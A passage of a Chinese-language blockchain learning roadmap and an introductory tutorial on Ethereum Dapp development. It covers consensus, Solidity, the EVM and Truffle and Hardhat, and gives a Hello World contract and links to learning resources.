href=\"https://www.odaily.news/\">🔗</a></li>\n<li>BlockBeats <a href=\"https://theblockbeats.info/\">🔗</a></li>\n<li>PANews <a href=\"https://www.panewslab.com/\">🔗</a></li>\n<li>TechFlow 深潮 <a href=\"https://www.techflowpost.com/\">🔗</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><strong>风险须知</strong><ul>\n<li>遵守国家法律法规！</li>\n<li>dyor，都是可选项，不是必选项。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"第二层\"><a href=\"#第二层\" class=\"headerlink\" title=\"第二层\"></a>第二层</h2><p>有了入门的基础后，其实接下去都是一些可选的专题，对其中感兴趣的专题可以进行了解与学习。</p>\n<ul>\n<li><p><strong>技术向</strong>：</p>\n<ul>\n<li><p>密码学：</p>\n<ul>\n<li>文章：介绍了简单的 <code>secp256k1</code>签名算法、比特币交易签名、 <code>schnorr</code> 多签 <a href=\"https://www.btcstudy.org/2022/06/13/part-2-bitcoin-p2tr-transaction-breakdown/\">🔗</a></li>\n<li><a href=\"https://github.com/paulmillr/noble-secp256k1\">noble-secp256k1</a>：<code>secp256k1</code> 签名和 <code>ECDH</code> 的最快 4KB JS 实现。极其简洁，但内容完整且经过算法优化，非常适合从底层了解签名算法。作者还专门写了一篇介绍椭圆曲线算法加速的文章 <a href=\"https://paulmillr.com/posts/noble-secp256k1-fast-ecc/\">🔗</a></li>\n<li>文章：介绍基于 <code>schnorr</code> 签名算法的 <code>musig</code> 多签名，可用于设计链下多签名。<a href=\"https://blog.blockstream.com/en-musig-a-new-multisignature-standard/\">🔗</a> 这里还有一个 typescript 的实现 <a href=\"https://github.com/wangshouh/musig\">🔗</a></li>\n</ul>\n</li>\n<li><p>共识算法：</p>\n<ul>\n<li>PoW 相关：<a href=\"https://github.com/indutny/proof-of-work\">🔗</a></li>\n<li>PoS：<a href=\"https://github.com/ethereum/consensus-specs\">🔗</a></li>\n<li>PBFT：<a href=\"https://pmg.csail.mit.edu/papers/osdi99.pdf\">🔗</a></li>\n<li>dpos+pbft 算法分析：<a href=\"https://github.com/sqfasd/dpos-pbft\">🔗</a></li>\n<li>PoH：<a href=\"https://docs.solanalabs.com/implemented-proposals/tower-bft#vote-tower\">🔗</a></li>\n<li>DAG：<ul>\n<li>IOTA：<a href=\"https://docs.iota.org/introduction\">🔗</a></li>\n<li>Byteball：<a href=\"https://byteball.org/\">🔗</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>智能合约：</p>\n<ul>\n<li>智能合约开发是区块链应用的基础，不同区块链平台的智能合约可能不太一样，但是大多数都是借鉴了以太坊的智能合约，对于公有链领域，搞懂以太坊及其智能合约是首要的。和前面一样，可以去阅读以太坊的官方文档，也可以看一些书。</li>\n<li>以太坊官方文档：<a href=\"https://ethereum.org/en/developers/docs/\">🔗</a></li>\n<li>Solidity 最新文档（可以切换版本查看其他版本的文档）：<a href=\"https://docs.soliditylang.org/en/latest/\">🔗</a></li>\n<li>书籍：《精通以太坊》<a href=\"https://github.com/ethereumbook/ethereumbook\">🔗</a>，主要就是介绍以太坊，以及如何在以太坊上写智能合约，以太坊 CTO 著，好书，至今依然在更新</li>\n<li>除了以太坊以外，还可以了解波卡、Polygon 和 Dfinity 等公有区块链。对于联盟链的智能合约，如 Hyperledger Fabric，可以自行找一些书或者文档看。</li>\n<li>以太坊 Dapp 开发学习路线：<a href=\"eth/eth_dapp.md\">🔗</a></li>\n<li>SOL 开发教程，非常详细 <a href=\"https://www.soldev.app/course\">🔗</a></li>\n</ul>\n</li>\n<li><p>虚拟机：</p>\n<ul>\n<li>evm<ul>\n<li>evm-awesome-list：<a href=\"https://ethereum.org/en/developers/docs/evm/\">🔗</a>，以太坊开发者官方文档</li>\n<li>evm 解析：<a href=\"https://github.com/CoinCulture/evm-tools/blob/master/analysis/guide.md\">🔗</a>，这是了解 EVM、它与 Solidity 的关系以及如何使用一些调试工具的指南。</li>\n<li>文章：使用 yul 汇编深入理解 solidity 和 evm 的底层技术 <a href=\"https://mirror.xyz/0xB38709B8198d147cc9Ff9C133838a044d78B064B/nk40v2MJKSHXXNSlbqqhpwJf4MtZ9V2Vp8P_bSNwjYc\">🔗</a>, 小白科普向，一共有三篇</li>\n<li><a href=\"https://www.evm.codes/\">EVM Codes</a>：探索 evm 和 solidity 底层必备工具，可以快速查找 Opcodes 操作码和 Precompiled 预编译函数的具体功能、用法和 gas 情况。另一个有用的工具是 <a href=\"https://book.getfoundry.sh/forge/debugger\">forge debugger</a></li>\n</ul>\n</li>\n<li>wasm（WebAssembly）<ul>\n<li>eth-ewasm：<a href=\"https://github.com/ewasm\">🔗</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>去中心化存储</p>\n<ul>\n<li>IPFS&#x2F;Filecoin：<a href=\"https://github.com/Blockchain-zju/blockchainer-roadmap/tree/master/ipfs\">🔗</a></li>\n</ul>\n</li>\n<li><p>跨链：</p>\n<ul>\n<li>跨链是目前区块链最前沿的技术，也是未来发展的重要方向之一</li>\n<li>论文：V 神总结的区块链互操作性文章：Buterin V. Chain interoperabilit <a href=\"https://www.r3.com/wp-content/uploads/2017/06/chain_interoperability_r3.pdf\">🔗</a></li>\n<li>一些不错的博客文章：<ul>\n<li>关于跨链技术的分析与思考：<a href=\"https://mp.weixin.qq.com/s/fgRPwzVPB3Si5aHSCACvAg\">🔗</a></li>\n<li>跨链通信简要研究：<a href=\"https://mp.weixin.qq.com/s/X7ztDBG6kqgrBaGwrrsfQw\">🔗</a></li>\n</ul>\n</li>\n<li>论文：Polkadot 最新的论文：Overview of Polkadot and its Design Considerations<a href=\"https://eprint.iacr.org/2020/641.pdf\">🔗</a></li>\n<li>国际最领先的跨链平台 Polkadot 源码（rust）：<a href=\"https://github.com/paritytech/polkadot\">🔗</a></li>\n<li>国内最领先的跨链平台 BitXHub 源码（go）：<a href=\"https://github.com/meshplus/bitxhub\">🔗</a></li>\n<li>有兴趣有精力的还可以了解下 Subtrate：<a href=\"https://substrate.dev/\">🔗</a></li>\n</ul>\n</li>\n<li><p>DeFi</p>\n<ul>\n<li>安全<ul>\n<li>文章：16个 solidity合约漏洞，修复和真实世界的案例 <a href=\"https://hackernoon.com/hackpedia-16-solidity-hacks-vulnerabilities-their-fixes-and-real-world-examples-f3210eba5148\">🔗</a></li>\n<li>工具：<ul>\n<li><a href=\"https://github.com/SunWeb3Sec/DeFiHackLabs\">DeFiHackLabs</a>：收录了很多资安事件的概念性验证程序</li>\n<li><a href=\"https://github.com/SunWeb3Sec/DeFiVulnLabs\">DeFiVulnLabs</a>：整理了常见Solidity的漏洞测试与防御方式</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>实现</li>\n</ul>\n</li>\n<li><p>MEV</p>\n</li>\n<li><p><strong>联盟链</strong>：</p>\n<ul>\n<li><strong>联盟链学习 roadmap - 第一层</strong>：<a href=\"consortium/consortium.md\">🔗</a></li>\n<li>联盟链领域只要搞懂了 Hyperledger Fabric、R3 Corda 这两个项目的东西基本上就搞懂了 80%的内容；学习方式可以是直接阅读这些项目上的文档、其他人写的博客、或者看书。</li>\n<li>Hyperledger Fabric 官方文档：<a href=\"https://hyperledger-fabric.readthedocs.io/en/latest/\">🔗</a></li>\n<li>书籍《区块链技术进阶实战》（豆瓣介绍<a href=\"https://book.douban.com/subject/30177480/\">🔗</a>，介绍了 Hyperledger Fabric、以太坊、Hyperchain）</li>\n<li>书籍《区块链原理、设计与应用》（豆瓣介绍<a href=\"https://book.douban.com/subject/27127839/\">🔗</a>，全书都是在讲 Hyperledger Fabric，有源码分析）</li>\n</ul>\n</li>\n<li><p>具体链相关资源</p>\n<ul>\n<li>ETH<ul>\n<li>eth roadmap - 第一层：<a href=\"eth/eth.md\">🔗</a></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong>商业向</strong>：</p>\n<ul>\n<li>research&#x2F;dataAnalysis：<ul>\n<li>文章：从新闻聚合器到链上分析工具，十大加密研究工具清单 <a href=\"https://abmedia.io/20220726-the-10-must-have-crypto-research-tools\">🔗</a></li>\n<li><a href=\"https://github.com/chainfeeds/RSSAggregatorforWeb3\">🥩 RAW</a>：一个聚合了500多个关于Web3的RSS的仓库，里面讲技术的略少，大量文章关于项目动态</li>\n</ul>\n</li>\n<li>ICO：<ul>\n<li>搜索并了解 ERC-20</li>\n<li>搜索并了解 ICO</li>\n<li>各国对 ICO 的监管态度</li>\n</ul>\n</li>\n<li>爆款区块链应用：<ul>\n<li>搜索并了解加密猫、像素大师</li>\n</ul>\n</li>\n<li>Token：<ul>\n<li>搜索并了解什么是代币经济学</li>\n</ul>\n</li>\n<li>Staking：<ul>\n<li>搜索并了解什么是 Staking Economy</li>\n</ul>\n</li>\n<li><strong>DeFi</strong>：Decentralized Finance<ul>\n<li>搜索并了解什么是 DeFi</li>\n<li>书籍推荐：《How to DeFi》：<a href=\"https://github.com/Blockchain-zju/HistoryFiles/blob/main/defi/How_to_DeFi_CHN.pdf\">🔗</a></li>\n</ul>\n</li>\n<li><strong>NFT</strong>：Non-fungible Token<ul>\n<li><strong>Roadmap-NFT 第一层</strong>：<a href=\"nft/nft.md\">🔗</a></li>\n<li>文章：了解 5 种流行的 NFT 投放方式及其优缺点 <a href=\"https://web3caff.com/zh/archives/23106\">🔗</a></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"第三层\"><a href=\"#第三层\" class=\"headerlink\" title=\"第三层\"></a>第三层</h2><blockquote>\n<p>越了解，越广阔</p>\n</blockquote>\n<ul>\n<li><p><strong>技术向</strong>：</p>\n<ul>\n<li><p>阅读经典论文&#x2F;文章：</p>\n<ul>\n<li>bitcoin 白皮书：Bitcoin: A Peer-to-Peer Electronic Cash System<a href=\"https://bitcoin.org/bitcoin.pdf\">🔗</a></li>\n<li>以太坊白皮书：Ethereum: A next-generation smart contract and decentralized application platform<a href=\"https://github.com/ethereum/wiki/wiki/White-Paper\">🔗</a><ul>\n<li>如果有能力也应该看下以太坊黄皮书：Ethereum: A secure decentralised generalised transaction ledger<a href=\"https://ethereum.github.io/yellowpaper/paper.pdf\">🔗</a></li>\n<li>以太坊的 wiki：<a href=\"https://github.com/ethereum/wiki/wiki\">🔗</a></li>\n<li>go-ethereum-code-analysis：<a href=\"https://github.com/ZtesoftCS/go-ethereum-code-analysis\">🔗</a></li>\n<li>以太坊源码分析-teaspring 的技术专栏：<a href=\"https://blog.csdn.net/teaspring\">🔗</a></li>\n<li>干货|以太坊分片:overview and finalit：<a href=\"https://ethfans.org/posts/ethereum-sharding-and-finality\">🔗</a></li>\n</ul>\n</li>\n<li>EOS 白皮书：<a href=\"https://github.com/EOSIO/Documentation/blob/master/TechnicalWhitePaper.md\">🔗</a></li>\n<li>Polkadot 白皮书：Polkadot: Vision for a heterogeneous multi-chain framework</li>\n<li>**这 33 篇区块链必读论文 , 读过 5 篇以上的竟不到 1%**：<a href=\"https://www.chainnews.com/articles/363251574672.htm\">🔗</a></li>\n<li>建议可以按照自己感兴趣的主题去<strong>Google Scholar</strong>里搜索，如：blockchain, distribute ledger 等。</li>\n</ul>\n</li>\n<li><p>阅读经典项目源码：</p>\n<ul>\n<li>Bitcoin 源码：<a href=\"https://github.com/bitcoin/bitcoin\">🔗</a></li>\n<li>Ethereum 源码(go-ethereum)：<a href=\"https://github.com/ethereum/go-ethereum\">🔗</a></li>\n<li>EOS 源码：<a href=\"https://github.com/EOSIO/eos\">🔗</a></li>\n<li>Hyperledger Fabric 源码：<a href=\"https://github.com/hyperledger/fabric\">🔗</a></li>\n</ul>\n</li>\n<li><p>ETH2.0：</p>\n<ul>\n<li>了解 ETH1.0 的扩容方案</li>\n<li>了解 ETH2.0 的 Roadmap 路线图</li>\n<li>了解 layer2 和分片的区别</li>\n<li>了解 layer2 最新进展 rollup 的两大方向 optimistic-rollup 和 zk-rollup 的区别</li>\n</ul>\n</li>\n<li><p><strong>联盟链</strong>：</p>\n<ul>\n<li><strong>联盟链学习 roadmap - 第二层</strong>：<a href=\"consortium/consortium.md\">🔗</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong>商业向</strong>（可以在公有链和联盟链中选一个，有精力的话建议全部都搞）：</p>\n<ul>\n<li>公有链方向，深入了解 DeFi 和 NFT：<ul>\n<li><strong>DeFi</strong><ul>\n<li>深入体验多款 DeFi 产品</li>\n<li>了解 DeFi 的生态，阅读一些 DeFi 的研究报告 <a href=\"https://github.com/Blockchain-zju/HistoryFiles/blob/main/defi/defi_report.pdf\">🔗</a></li>\n</ul>\n</li>\n<li><strong>NFT</strong><ul>\n<li>深入体验多款 NFT 产品</li>\n<li><strong>Roadmap-NFT 第二层</strong>：<a href=\"nft/nft.md\">🔗</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>联盟链方向，深入了解各个联盟链框架以及联盟链的商业价值和应用实践：<ul>\n<li><strong>联盟链学习 roadmap - 第三层</strong>：<a href=\"consortium/consortium.md\">🔗</a></li>\n<li>存证、溯源、供应链金融、数字身份、政务、版权保护….</li>\n<li>建议先看《2018 年中国区块链产业白皮书》，虽然目前已经是 2020 年了，但是这个报告确实不错</li>\n<li>有一些书籍：《产业区块链》（豆瓣介绍<a href=\"https://book.douban.com/subject/35030217/\">🔗</a>，腾讯系的区块链实践，马化腾作序，可以起到一些了解的作用）</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"第一百层\"><a href=\"#第一百层\" class=\"headerlink\" title=\"第一百层\"></a>第一百层</h2><blockquote>\n<p>浩瀚无垠，分头突围</p>\n</blockquote>\n<h2 id=\"其他优质资源\"><a href=\"#其他优质资源\" class=\"headerlink\" title=\"其他优质资源\"></a>其他优质资源</h2><ul>\n<li>awesome-blockchain：<a href=\"https://github.com/chaozh/awesome-blockchain-cn\">🔗</a></li>\n<li>awesome-metaverse：<a href=\"https://github.com/M3-org/awesome-metaverse\">🔗</a></li>\n<li>awesome-zjubca：<a href=\"https://github.com/Blockchain-zju/awesome-zjubca\">🔗</a></li>\n<li>Journey-to-become-a-Blockchain-Engineer: <a href=\"https://github.com/spo0ds/Journey-to-become-a-Blockchain-Engineer\">🔗</a></li>\n</ul>\n<p>多用 Google，多逛国外论坛，多水群，时刻关注区块链前沿。</p>\n<h2 id=\"大气层\"><a href=\"#大气层\" class=\"headerlink\" title=\"大气层\"></a>大气层</h2><p>从狭义区块链的视角转向广义区块链的视角：Web3。</p>\n<blockquote>\n<p>区块链是手段，Web3 是目的。</p>\n</blockquote>\n<ul>\n<li>Web3-WIKI：<a href=\"https://github.com/Web3-Club/Web3wiki-Website\">🔗</a></li>\n</ul>\n<h2 id=\"太空宇宙\"><a href=\"#太空宇宙\" class=\"headerlink\" title=\"太空宇宙\"></a>太空宇宙</h2><blockquote>\n<p>Metaverse：下一代互联网&#x2F;数字世界的形态。</p>\n</blockquote>\n<ul>\n<li>Metaverse-WIKI：<a href=\"https://en.wikipedia.org/wiki/Metaverse\">🔗</a></li>\n</ul>\n"},{"title":"03-Dapp","date":"2024-08-01T16:02:16.000Z","_content":"# 初探以太坊 Dapp 开发\n\nBY ZJUBCA\n\n本文假设读者已经对区块链有了基本的概念，如果你对诸如区块链、智能合约与 Dapp 这类词语完全陌生，那么我们建议读者先阅读协会的：[🔗ZJUBCA-Roadmap](../index.md)\n\n## 以太坊技术原理\n\n### 一、什么是以太坊（Ethereum）\n\n对以太坊的定义往往仁者见仁，但如果集大成来解释，以太坊是基于状态转换的「世界计算机」（所有人都可以访问并使用的计算机，不受空间限制）\n\n从计算机科学的角度来看，以太坊是一种确定但无界的由交易驱动的「状态机」（改变程序或系统保存的信息并保持共识的机体），它由全局可访问的离散单个状态和将变化应用于这种状态的虚拟机组成；从更实际的角度来看，以太坊是一种开源、在全球范围内呈去中心化并且能够执行「智能合约」（下文会详述，可简单理解为代码）的基础设施。\n\n在以太坊平台上，开发人员能够构建具有内置经济功能的强大的去中心化应用程序。它使用区块链来同步和存储系统的状态变化，并使用一种被称为「以太币」（Ether）的加密货币来计量和限制执行资源成本，提供了高可用性，可审计性，透明性和中立性。\n\n[🔗 以太坊白皮书](https://kauri.io/#collections/A%20Hackathon%20Survival%20Guide/ethereum-101-part-1-what-is-ethereum/)\n\n### 二、深入理解以太坊技术原理\n\n可能大家对上一节中提到的「状态机」的概念还有点模糊不清，为了让大家更清晰的深入到以太坊的技术原理中去，本节会以传统互联网为起点，循序渐进至以太坊的底层技术原理。\n\n用计算机技术来说，以太坊就是一个保存了数字交易永久记录的「公共数据库」。重要的是，这个数据库不需要任何中间方来维护双方的权益。相反，它可以作为一种「无需信任」的交易系统来运作，也就是你可以在不需要第三方的情况下进行点对点（P2P）交易。\n![](./pic/1.png)\n\n以太坊区块链本质上是一个为交易服务的状态机。在计算机科学中，一个状态机指的是这样一种东西，它可以读取一系列的输入，并基于这些输入产生一个新的状态。\n\n![](./pic/2.png)\n\n以太坊状态机的运行从一个「元状态」开始，这类似于在网络上没有发生任何交易之前的一个空白匣子。当交易执行时，这个元状态就转变为一些最终状态。在任何时候，这个最终状态都代表着以太坊区块链的现状。\n\n![](./pic/3.png)\n\n以太坊系统中运行着数百万笔交易，这些交易被分组归类为「区块」。每个区块由「区块头」（Header）和一系列「交易信息」(Transactions）组成。在这里，你可以简单地将区块头理解为一个包含决定区块链共识状态关键信息的 “数据集合”， 每个块只有通过对区块头的验证，才能与其前面的区块通过区块头串联在一起形成有向无环的链式结构。\n\n![](./pic/4.png)\n\n前文中提到，以太坊是由交易驱动的状态机。那么要想以太坊正确的从一个状态转到另一个状态，必须证明交易是有效且真实的，否则以太坊便失去了其不需要第三方维护这一核心价值。要想证明一个交易是有效的，就必须通过一个验证过程，这一过程称为「挖矿」。\n\n挖矿是指一组节点（即物理意义上的计算机）消耗它们的计算资源来创建一个有效交易的区块（这里仅以 Pow 为例）。网络中参与挖矿的节点被称为「矿工」。任何声明自己是「矿工」的节点都可以尝试创建和验证区块，全世界有许多矿工试图同时创建和验证区块。每个矿工在向区块链提交一个区块时同时，都要提供一个数学的证明，且把这个证明作为一个保证：如果这个数学证明存在，则该区块必然是有效的。\n\n一个矿工如果想要在主区块链上添加一个合法区块，就必须比其他矿工更快地对其证明。那么，通过让矿工提供数学证明来验证每个区块的过程被称为「工作量证明」。\n\n那么矿工为什么要消耗自己的计算机资源来验证并添加区块呢？答案是价值回报。任何完成这个验证工作的矿工都可以得到一定数额的价值回报。以太坊正是采用其链上数字货币「以太币」作为奖励。 每当一个矿工证明了一个区块，就会生成并得到一定数量的以太币。\n\n正如我们在上文给区块链的定义，区块链是一个具有共享状态的交易状态机。这个定义决定了，区块链的当前状态是一个单一的全局状态，每个人都必须接受。如果拥有多个链（状态）会破坏整个系统，因为人们不可能就哪个状态是正确的状态达成一致意见。如果这些链是分开的，就会出现一个人在一条链上有 10 个以太币，在另一条链上有 20 个的情况。在这种情况下，我们没有办法确定哪一个链最「有效」，无法确定一个人有多少有效的以太币。\n\n这一产生多条链的过程，被称为「分叉」（Fork）。因为分叉会破坏系统，因此我们通常会避免分叉，要求或者说迫使人们选择他们「相信」唯一有效的一条链。\n\n![](./pic/5.png)\n\n为了确定哪个路径是最有效的，并防止分叉的发生，以太坊使用了一种叫做「GHOST 协议」的机制。简单地说，GHOST 协议让我们必须选择在链上做「最多计算」的路径。确定该路径的一种方法是通过计算每条链所使用最新区块的数量，来表示当前每条链上的区块总数（不包括创世区块）。块数越多，路径越长，则说明挖矿的难度越大，因此该链就为最多计算链。因此这个方法也可以被简称为「最长链原则」。通过这个方式，最终使每一个节点对当前区块链的状态（链）的唯一性达成共识。\n\n![](./pic/6.png)\n\n到这里，我们就对以太坊区块链就有了一个宏观的认识。在这个链式架构的基础上，以太坊系统由如下所述的各主要组成部分支撑，如果你想更深入的了解这些，我们推荐你阅读以太坊黄皮书，不过请注意，他并没有那么易懂~\n\n[🔗 以太坊黄皮书](https://gitcode.net/mirrors/wanshan1024/ethereum_yellowpaper)\n\n-   帐户；\n-   状态；\n-   Gas 与费用；\n-   交易；\n-   区块；\n-   交易执行；\n-   挖矿；\n-   工作量证明。\n\n## Solidity 及 EVM\n\n### 一、Solidity——面向合约对象的编程语言\n\nSolidity 是由以太坊创始人之一的 Gavin Wood 所编写，是一门面向合约的、为实现智能合约而创建的高级编程语言。这门语言受到了 C++，Javascript 等语言的影响，属于静态类型语言，支持继承、库和复杂的用户定义类型等特性。其设计目的是为了能在以太坊虚拟机（EVM）上运行。\n\n众所周知，以太坊之所以被称为区块链 2.0 的开山鼻祖，其中重要的一点就是实现了「图灵完备」。所谓图灵完备，就是一切可计算的问题都能计算，这样的虚拟机或者编程语言就叫图灵完备的，图灵完备通常指具有无限存储能力的通用物理机器或编程语言。那么与图灵完备相反的是图灵不完备，比如比特币的脚本系统，就是图灵不完备的。要想充分发挥以太坊图灵完备的优势，就要通过编写运行在 EVM 上（也可以理解为链上）的「智能合约」。那么 Solidity，就是编写智能合约的编程语言。\n\n当然，除了 Solidity 以外，还有例如与 Python 接近的、文件名以.se 结尾 Serpent 编程语言也曾经流行过一段时间，除此之外也有开发者更喜欢使用 Vyper。但随着时间的推移和开发者们不断地学习和迭代，现在最成熟且应用最多的当数是 Solidity 了，因此这也是我们鼓励大家学习它的原因。\n\n以下是通过 Solidity 编写的“Hello Wordl!”代码，其中，^0.8.0 是编译器的版本号，HelloWorld 是合约名，greet 是状态变量。\n\n```solidity\n// SPDX-Lisence-Identifier: MIT\n// compiler version must be greater than or equal to 0.8.10 and less than 0.9.0\npragma solidity ^0.8.10;\n\ncontract HelloWorld {\n  string public greet = \"Hello World!\";\n}\n```\n\n如果你已经迫不及待的想要成为一名智能合约开发者，那么以下列出的学习工具一定有助于你：\n\n-   Remix ---智能合约在线开发工具：[🔗](https://remix.ethereum.org)\n-   Solidity 最新(0.8.0)中文文档：[🔗](https://learnblockchain.cn/docs/solidity)\n-   Cryptozombies ---玩游戏的方式学习 Solidity：[🔗](https://cryptozombies.io)\n-   Solidity by Example ---以太坊官方教程：[🔗](https://solidity-by-example.org)\n\n### 二、EVM——基于堆栈的以太坊虚拟机\n\n在了解 EVM 之前，首先清楚什么是虚拟机？传统的虚拟机指的是，通过软件模拟的，具备完整硬件系统功能，并运行在隔离环境下的完整计算机系统，比如 VMware、Java 虚拟机等。\n那么什么是以太坊虚拟机呢？\n\n以太坊虚拟机的英文全称为“Ethereum Virtual Machine”，简称为 EVM，这个 EVM 就是建立在以太坊区块链上的代码运行环境，是一个完全独立的沙盒，合约代码可对外完全隔离并在 EVM 内部运行，其主要作用是处理以太坊系统内的智能合约。上文提到的 Solidity 代码在部署到以太坊网络之前需要被编译成字节码。这个字节码所对应的底层机制，实际上就是 EVM 所解析的一系列操作码指令，然后由 EVM 根据此操作码，真正的完成代码的执行。\n\n从传统互联网的角度来说，程序员在为一个软件编写程序时，会使用到编程语言，例如 C++。但 C++ 是计算机的 CPU 无法理解的高级语言。程序员通过 C++ 编写好的程序需要通过编译器翻译成 CPU 可以理解的语言，即字节代码（机器语言），从而对 CPU 发号施令让软件可以在计算机上顺利运行。\n\n如果听到这里你觉得有些困惑，不必担心，坚持看完下面的例子，一定能“柳暗花明又一村”。\n\n假设一名 ZJUBCAer 小蓝是一个英语盲，但作为一名区块链爱好者，它需要经常查看一些英语文章来及时掌握行业信息。为了解决语言障碍，它会把文章通过翻译软件转译成中文再阅读。\n\n![](./pic/8.png)\n\n一篇用英语写成的文章被翻译为中文，变成了小蓝能看懂的语言，从而帮助小蓝能够轻松掌握区块链的行业信息。同理，一个用 C++ 编成的程序被编译为字节代码，变成 CPU 能看懂的语言，CPU 可以运行软件程序。\n可这跟以太坊的 EVM 有什么关系？答案是，EVM 之于以太坊，就像 CPU 之于计算机。\n\n![](./pic/9.png)\n\n以太坊是一台世界级计算机，但它毕竟不是实体电脑，也没有 CPU，那么智能合约要如何在以太坊上运行呢？EVM 就是以太坊的 CPU，以太坊开发者们通过编程语言 Solidity 写好的程序，被编译为 EVM 可以理解的 EVM 字节代码，EVM 就可以运行智能合约的程序。\n\n到这里，相信你一定对 EVM 有了初步的认识，如果你想更进一步，那么我们建议你通过 EVM 练兵场，通过学以致用的方式，更好的掌握 EVM 的底层逻辑。\n\nEVM 练兵场：[🔗](https://www.evm.codes/)\n\n## 智能合约开发\n\n什么是智能合约？其实通过上文的阅读，相信读者已经大概做到了心中有数，以太坊网络上运行程序就称之为智能合约，它和其他的程序一样，也是代码和数据(状态)的集合。\n\n智能合约（Smart Contract）和人工智能（Artificial Intelligence ）的智能没有关系，智能合约最早由尼克萨博在 95 年提出，它的概念很简单，就是将法律条文写成可执行代码。让法律条文的执行中立化，这个理念和区块链上的程序可以不被篡改、不被干预（只有有人触发交易，它将自动执行）的执行不谋而合，因此区块链引入了这个概念。以太坊网络上运行程序就称之为智能合约。\n\n### 一、以太坊客户端\n\n大家都知道，如果想跟一个独立系统交互，仅仅编写了可以被该系统编译识别的代码还不够，还需要与该系统建立稳定的连接才能将数据传输过去。前文提到，以太坊虚拟机 EVM 是一个封闭的沙盒系统，其内部代码的运行是不受到外部世界的干扰的。那么，开发者如果想访问到以太坊并且期望与之交互应该怎么做呢？答案是通过以太坊客户端。\n\n「以太坊客户端」是一个软件应用程序，它实现以太坊规范并通过 P2P 网络与其他以太坊客户端（节点）进行通信。如果不同的以太坊客户端符合参考规范和标准化通信协议，则可以进行相互操作。\n\n以太坊是一个开源项目，由“黄皮书”正式规范定义。除了各种以太坊改进提案之外，此正式规范还定义了以太坊客户端的标准行为。因为以太坊有明确的正式规范，所以，任何一个独立开发的软件，只要实现了该范式，那他就可以作为一个以太坊节点，与以太坊或其它以太坊客户端交互。\n目前以太坊客户端支持 8 种语言的客户端，这里推荐其中两款：\n\n-   go-ethereum（geth）[🔗](https://github.com/ethereum/go-ethereum)：Golang 实现，官方推荐，开发使用最多\n-   Parity[🔗](https://github.com/ethcore/parity/releases)：Rust 实现，最轻便客户端，在历次以太网攻击中表现卓越\n\n### 二、开发框架\n\n上文讲到，开发者如果想要跟以太坊交互，需要借助客户端来搭建节点才行。理论上虽然如此，但不禁想一下，如果每次开发都要手动搭建节点，且面向不同以太坊网络时还应重新搭建，未免给我们的开发增添了太多不必要的负担，对开发者的技术要求也更加严格，这显然是不利于以太坊乃至区块链技术的普及。\n\n互联网软件开发的历史已有数十年之久。我们受益于半个世纪以来积累的最佳实践，设计模式和智慧。相反，智能合约开发才刚刚开始。2015 推出的以太坊和 Solidity 仅有几年的时间。在智能合约刚推出的前几年，没有确定的工具堆栈来帮助开发者部署智能合约以及构建去中心化应用。\n\n但随着区块链技术的蓬勃发展以及广大开发者极客们的集思广益，诸如 Truffle、Hardhat 的 Dapp 开发框架应用的出现，极大的方便了开发者与区块链的交互，丰富了整个以太坊生态系统。\n\n#### - Truffle\n\nTruffle 是第一套基于以太坊的 Solidity 语言的成熟的开发框架。本身是基于 JavaScript。它对客户端做了深度集成，使开发、测试、部署都只需要一个命令行，可以在控制台使用命令行直接调用输出结果，方便调试。\nTruffle 是本地编译、部署智能合约的框架；而向前文中提到的 geth 客户端连接的才是真正的以太坊环境；testrpc 是 Truffle 本地使用内存模拟的以太坊环境，关闭终端后，部署到 testrpc 的智能合约不会保存下来，对于开发调试更加方便，合约可以在 testrpc 中通过测试后，再部署到 geth 上，从而减少不必要的损失。\n\n-   Truffle：[🔗](https://learnblockchain.cn/docs/truffle/quickstart.html)\n\n#### - Hardhat\n\nHardhat 是一个编译、部署、测试和调试以太坊应用的开发环境。它可以帮助开发者管理和自动化构建智能合约和 dApps 过程中固有的重复性任务，并围绕这一工作流程轻松引入更多功能。\nHardhat 内置了 Hardhat 网络，这是一个专为开发设计的本地以太坊网络。主要功能有 Solidity 调试，跟踪调用堆栈、console.log()和交易失败时的明确错误信息提示等，其在智能合约的 Debug 调试过程的交互性要优于 Truffle。\n除此之外，与 Truffle 不同的是，Hardhat 是一款基于插件的开发框架，其很多功能都来自于插件，开发者可以自由选择想使用的插件，甚至还可以将现有的 Truffle 项目迁移到 Hardhat 上。\n\n-   Hardhat：[🔗](https://learnblockchain.cn/docs/hardhat/getting-started)\n\n### 三、Dapp 开发\n\n#### 什么是 Dapp?\n\nApp 我们都知道是客户端应用，是 application 的简称。DApp 就是 D+App，D 是英文单词 decentralization 的首字母，单词翻译中文是去中心化，即 DApp 为去中心化应用。\n\n看到这里，大家思维中第一反应可能是，为什么要有 DApp，现在的 App 不是挺好吗？其实，两者并不是取代关系，而是并存关系，或者说 DApp 是对 App 的丰富和完善。因为 DApp 是依托于区块链底层技术的上层建筑，它和交易数据、交易资产有关联，和不可篡改去中心化存储也有关联，所以随着区块链技术越来越成熟普及，DApp 也更受到人们的青睐与期望，并更多地出现在各个生活场景中，如生产链防伪，捐款资金流向等等。\n\n![](./pic/10.png)\n\n那么作为一名开发者，是开发一款自己的 Dapp 需要做的具体步骤是什么？\nDapp 的一般开发流程：\n\n1. 创建自己的 Web3.0 钱包\n2. 使用 Solidity 编写智能合约代码\n3. 通过 Dapp 开发框架如 Hardhat、Truffle，通过 node.js 测试合约并部署\n4. 编写前端界面，并通过如 ether.js、web3.js 与智能合约进行交互\n5. 项目发布与测试\n\n-   node.js 介绍文档：[🔗](https://www.runoob.com/nodejs/nodejs-tutorial.html)\n-   ether.js 中文文档：[🔗](https://learnblockchain.cn/docs/ethers.js)\n-   web3.js(1.0)中文文档：[🔗](http://cw.hubwiz.com/card/c/web3.js-1.0/1/1/1/)\n\n## 常用工具及网站\n\n### 一、数据查询\n\n-   Etherscan ---以太坊区块链浏览器：[🔗](https://etherscan.io)\n-   Ethereum Signature Database ---EVM 调用记录数据库：[🔗](https://www.4byte.directory)\n-   ENS 